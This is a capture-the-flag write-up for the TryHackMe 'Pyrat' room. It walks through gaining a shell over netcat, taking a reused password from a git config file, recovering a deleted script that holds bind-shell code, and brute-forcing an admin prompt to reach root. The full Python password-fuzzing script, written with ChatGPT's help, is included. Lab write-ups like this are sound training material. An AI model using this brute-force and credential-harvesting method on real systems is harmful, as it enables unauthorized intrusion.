> [This room](https://tryhackme.com/r/room/pyrat) is a good practice that allows us to exploit an insecure HTTP server, retrieve valuable information available left by git on a machine and then fuzz passwords.

## Recon & Initial Access

Here is the starting nmap scan :

```shell
nmap -sS -sV -T4 $TARGET
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-04 21:01 CET
Nmap scan report for 10.10.134.236
Host is up (0.035s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.74 seconds
```

There is only an **SSH** port and a **SimpleHTTP python server** running on port `8000`. Directly, we check what is running on it using `curl` command.

```shell
$ curl -v http://10.10.134.236:8000
*   Trying 10.10.134.236:8000...
* Connected to 10.10.134.236 (10.10.134.236) port 8000 (#0)
> GET / HTTP/1.1
> Host: 10.10.134.236:8000
> User-Agent: curl/7.88.1
> Accept: */*
>
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Server: SimpleHTTP/0.6 Python/3.11.2

< Content-type: text/html; charset=utf-8
< Content-Length: 27
<
* Excess found in a read: excess = 3, size = 27, maxdownload = 27, bytecount = 0
* Closing connection 0
Try a more basic connection#
```

Surprisingly, it says us to *try a more basic connection*.

This server is under **SimpleHTTP** so it means that it was started using `python -m http.server` on the default port so `8000`.

What could be a more basic connection ? Well probably by using `nc` ?

```shell
$ nc $TARGET 8000
shell
$ ls
ls
ls: cannot open directory '.': Permission denied
$ pwd
pwd
/root
$ whoami
whoami
www-data
```

And just like this (by randomly typing *"shell"*), we got a shell as `www-data`!

So as always when I get a shell with `www-data`, I decide to execute my routine and delve into the common folders to search into, `/opt` being one of them.

In `/opt`, as a hidden directory, we can see that `git` is installed on the machine.

```shell
www-data@Pyrat:/opt/dev$ ls -a
ls -a
.  ..  .git

www-data@Pyrat:/opt/dev/.git$ ls -la
ls -la
total 52
drwxrwxr-x 8 think think 4096 Jun 21  2023 .
drwxrwxr-x 3 think think 4096 Jun 21  2023 ..
drwxrwxr-x 2 think think 4096 Jun 21  2023 branches

drwxrwxr-x 2 think think 4096 Jun 21  2023 info
drwxrwxr-x 3 think think 4096 Jun 21  2023 logs
drwxrwxr-x 7 think think 4096 Jun 21  2023 objects
drwxrwxr-x 4 think think 4096 Jun 21  2023 refs
```

Maybe we could find interesting information in this directory ? The good point is that we can read every file in it, so by display the `config` file, we stumble onto some **credentials** for a certain user called `think` (who owns this git repo) :

```shell
www-data@Pyrat:/opt/dev/.git$ cat config
cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential "https://github.com"]
        username = think
        password = _T[REDACTED]$_
```

Apparently, this is a credential set for **Github** but by curiosity, I still try to switch to the `think` user using this newly found password :

```shell
www-data@Pyrat:/opt/dev/.git$ su - think
su - think
Password: _T[REDACTED]$_

think@Pyrat:~$ whoami
whoami
think
```

Luckily for us, this password is also the one used for the local machine account! Without further a do, we are able to retrieve the **first flag**.

## Privilege Escalation

Now that we have access to the `think` user, who completely owns this git on the machine, we can dive into it a little more.

We can first search in the `logs` directory for some logged info :

```shell
think@Pyrat:/opt/dev/.git$ cat logs/HEAD
cat logs/HEAD
0000000000000000000000000000000000000000 0a3c36d66369fd4b07ddca72e5379461a63470bf Jose Mario <josemlwdf@github.com> 1687339934 +0000    commit (initial): Added shell endpoint
```

We can improve the display of this information using the `git cat-file` command and the **commit hash** :

```shell
think@Pyrat:/opt/dev/.git$ git cat-file -p 0a3c36d66369fd4b07ddca72e5379461a63470bf
<at-file -p 0a3c36d66369fd4b07ddca72e5379461a63470bf
tree 56110f327a3265dd1dcae9454c35f209c8131e26
author Jose Mario <josemlwdf@github.com> 1687339934 +0000
committer Jose Mario <josemlwdf@github.com> 1687339934 +0000

Added shell endpoint
```

Nothing too important right here, so let’s list the commit history :

```shell
think@Pyrat:/opt/dev/.git$ git log --all --name-only --pretty=format:
git log --all --name-only --pretty=format:
WARNING: terminal is not fully functional
-  (press RETURN)
pyrat.py.old
```

As we can see, a file named `pyrat.py.old` was committed but maybe deleted after that (the file is not present on the machine).

Now we know that the **commit hash** we previously found belongs to `pyrat.py.old`, but what we want now is the **object hash**.

For that, we list the tree objects for the relevant commit (here with our commit hash) :

```shell
think@Pyrat:/opt/dev/.git$ git ls-tree 0a3c36d66369fd4b07ddca72e5379461a63470bf
<it ls-tree 0a3c36d66369fd4b07ddca72e5379461a63470bf
100644 blob ce425cfd98c0a413205764cb1f341ae2b5766928    pyrat.py.old
```

The hash (`ce425cfd98c0a413205764cb1f341ae2b5766928`) is the **object hash** we want.

Using this, we can inspect the content of `pyrat.py.old` :

```shell
think@Pyrat:/opt/dev/.git$ git cat-file -p ce425cfd98c0a413205764cb1f341ae2b5766928
<at-file -p ce425cfd98c0a413205764cb1f341ae2b5766928
...............................................

def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e

...............................................
```

However, it seems that this script is not complete yet. 

I continued searching for the rest of it but couldn’t manage to get my hands on it. I was struggling until I realized something with the line of code `data == ‘shell’` .

On my initial access using **netcat**, this is the word I instinctively typed, this worked and opened me a shell with restricted privileges, just like this script describes.

Because this script is an older version of the `pyrat.py`, what could happen if I find the *“right endpoint”* to put instead of `‘some_endpoint’` on the line `if data == ‘some_endpoint’` ?

This is what I can do, but before creating a script, I try a few **common usernames** and manage to hit right when I type **admin**, and by looking at how it behaves, it seems that can try fuzzing :

```shell
$ nc $TARGET 8000
admin
Password:
admin
Password:
test
Password:
```

Hence, thanks to the help of chatGPT, we create a script in order to fuzz passwords using the `rockyou.txt` wordlist (and adjusting it because we can only enter the password 3 times before refreshing the client and restarting the connection) :

```shell
import socket
import time

# Target host and port
target_ip = "10.10.134.236"  # Replace with the actual target IP
target_port = 8000

# Path to the wordlist file (e.g., rockyou.txt)
wordlist_path = "/usr/share/wordlists/rockyou.txt"  # Replace with the path to your wordlist file

# Function to read wordlist from file
def load_wordlist(file_path):
    with open(file_path, 'r', encoding='latin-1') as file:
        return [line.strip() for line in file.readlines()]

# Function to fuzz passwords
def fuzz_passwords():
    attempt_count = 0  # Track the number of failed attempts
    passwords = load_wordlist(wordlist_path)  # Load the wordlist
    
    while attempt_count < len(passwords):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((target_ip, target_port))
            
            # Send the 'admin' endpoint
            s.sendall(b"admin\n")
            response = s.recv(4096).decode("utf-8")  # Read the response after sending 'admin'

            # Check if we reached the password prompt
            if "Password:" in response:
                print("Password prompt received. Starting fuzzing...")

                # Fuzz through the passwords in the wordlist
                for password in passwords[attempt_count:]:
                    # Send the password and check the response
                    s.sendall(password.encode() + b"\n")
                    response = s.recv(4096).decode("utf-8")
                    attempt_count += 1  # Increment the attempt count

                    # Check if the password was correct (adjust based on actual response)
                    if "Welcome" in response or "Access granted" in response:
                        print(f"Correct password found: {password}")
                        return  # Exit once the correct password is found
                    else:
                        print(f"Attempted password: {password} - Incorrect")

                    # If we reached 3 failed attempts, close the current connection and try again
                    if attempt_count % 2 == 0:
                        print("Reached 2 failed attempts. Restarting client...")
                        break

            else:
                print("No password prompt detected. Check if the server is responding correctly.")
                break  # Exit the loop if no password prompt is detected

# Run the password fuzzing
fuzz_passwords()
```

Then we let the magic happen, and we find a password quite quickly :

```shell
$ python3 scriptfuzz.py
Password prompt received. Starting fuzzing...
Attempted password: 123456 - Incorrect
Attempted password: 12345 - Incorrect
Reached 2 failed attempts. Restarting client...
Password prompt received. Starting fuzzing...
Attempted password: 123456789 - Incorrect
Attempted password: password - Incorrect
Reached 2 failed attempts. Restarting client...
Password prompt received. Starting fuzzing...
Attempted password: iloveyou - Incorrect
Attempted password: princess - Incorrect
Reached 2 failed attempts. Restarting client...
Password prompt received. Starting fuzzing...
Attempted password: 1234567 - Incorrect
Attempted password: rockyou - Incorrect
Reached 2 failed attempts. Restarting client...
Password prompt received. Starting fuzzing...
Attempted password: 12345678 - Incorrect
Correct password found: [REDACTED]
```

When we try to connect with those credentials, we are welcomed as the `admin` and obtain a shell with **root privileges**. Then, we witness the presence of the original `pyrat.py` file and the **root flag** in the `/root` directory.

```shell
$ nc $TARGET 8000
admin
Password:
[ADMIN_PASSWORD]
Welcome Admin!!! Type "shell" to begin
shell
# whoami
whoami
root
# ls
ls
pyrat.py  root.txt  snap
# cat root.txt
cat root.txt
[REDACTED]
```
